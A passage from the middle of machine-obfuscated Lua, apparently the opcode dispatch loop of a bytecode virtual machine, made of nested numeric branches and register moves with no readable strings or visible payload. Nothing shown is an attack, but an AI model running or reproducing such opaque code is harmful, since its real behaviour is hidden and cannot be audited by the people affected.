m=nil else if 2>d then w[y[134]]={};else n=n+1;end end else if d<=4 then if d<4 then y=f[n];else w[y[134]]=h[y[652]];end else if 6>d then n=n+1;else y=f[n];end end end else if d<=9 then if d<=7 then w[y[134]]=w[y[652]][y[76]];else if 8<d then y=f[n];else n=n+1;end end else if d<=11 then if d<11 then w[y[134]][y[652]]=w[y[76]];else n=n+1;end else if 13~=d then y=f[n];else w[y[134]]=j[y[652]];end end end end else if d<=20 then if d<=16 then if d<=14 then n=n+1;else if 15<d then w[y[134]]=w[y[652]][y[76]];else y=f[n];end end else if d<=18 then if 17==d then n=n+1;else y=f[n];end else if 20~=d then w[y[134]]=j[y[652]];else n=n+1;end end end else if d<=23 then if d<=21 then y=f[n];else if 22==d then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end else if d<=25 then if 24<d then m=y[134]else y=f[n];end else if d<27 then w[m]=w[m]()else break end end end end end d=d+1 end elseif 235>z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d]()else local d;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=258 then if z<=246 then if z<=240 then if z<=237 then if 237>z then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if(w[y[134]]~=w[y[76]])then n=n+1;else n=y[652];end;else local d;local m;local q;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];q=y[134]m={w[q](w[q+1])};d=0;for x=q,y[76]do d=d+1;w[x]=m[d];end end;elseif z<=238 then local d=y[134]local i,m=i(w[d](w[d+1]))p=m+d-1 local m=0;for q=d,p do m=m+1;w[q]=i[m];end;elseif 240~=z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d;w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];d=y[134]w[d](r(w,d+1,y[652]))end;elseif z<=243 then if z<=241 then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d]()elseif 242==z then if(w[y[134]]~=y[76])then n=n+1;else n=y[652];end;else local d;w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=244 then local d;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];d=y[134]w[d](r(w,d+1,y[652]))elseif 246~=z then local d;w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=252 then if z<=249 then if 247>=z then local d=0 while true do if d<=18 then if d<=8 then if d<=3 then if d<=1 then if 1~=d then w[y[134]]=j[y[652]];else n=n+1;end else if d==2 then y=f[n];else w[y[134]]=w[y[652]][y[76]];end end else if d<=5 then if 4<d then y=f[n];else n=n+1;end else if d<=6 then w[y[134]]=j[y[652]];else if d>7 then y=f[n];else n=n+1;end end end end else if d<=13 then if d<=10 then if 9==d then w[y[134]]=j[y[652]];else n=n+1;end else if d<=11 then y=f[n];else if d>12 then n=n+1;else w[y[134]]=j[y[652]];end end end else if d<=15 then if d>14 then w[y[134]]=j[y[652]];else y=f[n];end else if d<=16 then n=n+1;else if 18>d then y=f[n];else w[y[134]]=j[y[652]];end end end end end else if d<=27 then if d<=22 then if d<=20 then if 20>d then n=n+1;else y=f[n];end else if 21==d then w[y[134]]=j[y[652]];else n=n+1;end end else if d<=24 then if d~=24 then y=f[n];else w[y[134]]=j[y[652]];end else if d<=25 then n=n+1;else if d>26 then w[y[134]]=j[y[652]];else y=f[n];end end end end else if d<=32 then if d<=29 then if 29~=d then n=n+1;else y=f[n];end else if d<=30 then w[y[134]]={};else if 32~=d then n=n+1;else y=f[n];end end end else if d<=34 then if d<34 then w[y[134]]=w[y[652]][y[76]];else n=n+1;end else if d<=35 then y=f[n];else if d<37 then if not w[y[134]]then n=n+1;else n=y[652];end;else break end end end end end end d=d+1 end elseif z<249 then w[y[134]]=w[y[652]];else local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=250 then local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for q=m,y[76]do d=d+1;w[q]=i[d];end elseif 251<z then local d;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=false;n=n+1;y=f[n];d=y[134]w[d](w[d+1])end;elseif 255>=z then if z<=253 then local d;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d]()elseif 254==z then do return end;else w[y[134]]=#w[y[652]];end;elseif 256>=z then local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];m=y[652];i=y[76];d=k(w,g,m,i);w[y[134]]=d;elseif z>257 then local d=y[134]local i={w[d](w[d+1])};local m=0;for q=d,y[76]do m=m+1;w[q]=i[m];end else local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]]*y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=270 then if z<=264 then if 261>=z then if 259>=z then local d=y[134]w[d]=w[d]()elseif z>260 then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;else w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;end;elseif z<=262 then local d=y[134];do return r(w,d,p)end;elseif 264~=z then local d;w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]][y[652]]=y[76];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];m=y[652];i=y[76];d=k(w,g,m,i);w[y[134]]=d;end;elseif z<=267 then if 265>=z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))elseif 266==z then w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];if w[y[134]]then n=n+1;else n=y[652];end;else w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];if(w[y[134]]~=y[76])then n=n+1;else n=y[652];end;end;elseif 268>=z then w[y[134]]=w[y[652]][w[y[76]]];elseif z==269 then local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for q=m,y[76]do d=d+1;w[q]=i[d];end else local d;w={};for i=0,u,1 do if i<o then w[i]=s[i+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=276 then if 273>=z then if 271>=z then n=y[652];elseif z~=273 then local d=y[134]w[d]=w[d]()else w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];n=y[652];end;elseif z<=274 then local d;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))elseif z==275 then local d=y[134];local i=w[y[652]];w[d+1]=i;w[d]=i[w[y[76]]];else w[y[134]][w[y[652]]]=w[y[76]];end;elseif 279>=z then if z<=277 then if(w[y[134]]<=w[y[76]])then n=n+1;else n=y[652];end;elseif 279~=z then local d;local i;local m;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for q=m,y[76]do d=d+1;w[q]=i[d];end else for d=y[134],y[652],1 do w[d]=nil;end;end;elseif 280>=z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134];do return w[d](r(w,d+1,y[652]))end;n=n+1;y=f[n];d=y[134];do return r(w,d,p)end;n=n+1;y=f[n];n=y[652];elseif 282>z then local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for q=m,y[76]do d=d+1;w[q]=i[d];end else local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]]*y[76];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]]+w[y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif 329>=z then if z<=305 then if 293>=z then if z<=287 then if z<=284 then if 284>z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](w[d+1])else local d;w={};for i=0,u,1 do if i<o then w[i]=s[i+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=#w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134];w[d]=w[d]-w[d+2];n=y[652];end;elseif z<=285 then local d=y[134]local i={w[d](r(w,d+1,p))};local m=0;for q=d,y[76]do m=m+1;w[q]=i[m];end elseif z>286 then local d;local i;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]={r({},1,y[652])};n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];i=y[134];d=w[i];for m=i+1,y[652]do t(d,w[m])end;else if w[y[134]]then n=n+1;else n=y[652];end;end;elseif 290>=z then if z<=288 then if(w[y[134]]~=w[y[76]])then n=y[652];else n=n+1;end;elseif 289==z then local d;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][w[y[652]]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];d=y[134]w[d]=w[d](w[d+1])else local d=y[652];local i=y[76];local d=k(w,g,d,i);w[y[134]]=d;end;elseif 291>=z then w[y[134]]=w[y[652]]+w[y[76]];elseif z~=293 then local d;w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif 299>=z then if z<=296 then if z<=294 then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=false;n=n+1;y=f[n];d=y[134]w[d](w[d+1])elseif z==295 then local d=y[134]w[d](r(w,d+1,y[652]))else local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for q=m,y[76]do d=d+1;w[q]=i[d];end end;elseif z<=297 then local d;w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]][y[652]]=w[y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d]()elseif 299>z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d;w={};for i=0,u,1 do if i<o then w[i]=s[i+1];else break;end;end;n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];d=y[134]w[d](w[d+1])end;elseif z<=302 then if z<=300 then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]={};n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d]()elseif 301<z then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))end;elseif z<=303 then local d;local i;local m;w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=w[y[652]][w[y[76]]];n=n+1;y=f[n];m=y[134]i={w[m](w[m+1])};d=0;for q=m,y[76]do d=d+1;w[q]=i[d];end elseif 304==z then local d;w[y[134]]=w[y[652]];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];w[y[134]]=y[652];n=n+1;y=f[n];d=y[134]w[d]=w[d](r(w,d+1,y[652]))else local d=y[134];w[d]=w[d]-w[d+2];n=y[652];end;elseif z<=317 then if z<=311 then if z<=308 then if z<=306 then if(y[134]<w[y[76]])then n=n+1;else n=y[652];end;elseif 308>z then local d;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](w[d+1])else w[y[134]]=w[y[652]][w[y[76]]];end;elseif 309>=z then w[y[134]]=y[652];elseif 310<z then local d;w[y[134]]=j[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];d=y[134]w[d]=w[d](w[d+1])else w[y[134]]=false;n=n+1;end;elseif 314>=z then if 312>=z then local d,i=0 while true do if d<=8 then if d<=3 then if d<=1 then if 1~=d then i=nil else w[y[134]]=w[y[652]][y[76]];end else if d==2 then n=n+1;else y=f[n];end end else if d<=5 then if 4<d then n=n+1;else w[y[134]]=w[y[652]][y[76]];end else if d<=6 then y=f[n];else if 7==d then w[y[134]]=w[y[652]][y[76]];else n=n+1;end end end end else if d<=13 then if d<=10 then if 9==d then y=f[n];else w[y[134]]=w[y[652]][y[76]];end else if d<=11 then n=n+1;else if d>12 then w[y[134]]=w[y[652]][y[76]];else y=f[n];end end end else if d<=15 then if d<15 then n=n+1;else y=f[n];end else if d<=16 then i=y[134]else if d~=18 then w[i]=w[i](w[i+1])else break end end end end end d=d+1 end elseif z<314 then local d;w[y[134]]=w[y[652]][y[76]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=h[y[652]];n=n+1;y=f[n];w[y[134]]=w[y[652]];n=n+1;y=f[n];d=y[134]w[d](r(w,d+1,y[652]))else local d=w[y[134]]+y[76];w[y[134]]=d;if(d<=w[y[134]+1])then n=y[652];end;end;elseif z<=315 then w[y[134]]();elseif z>316 then local d;local i;local 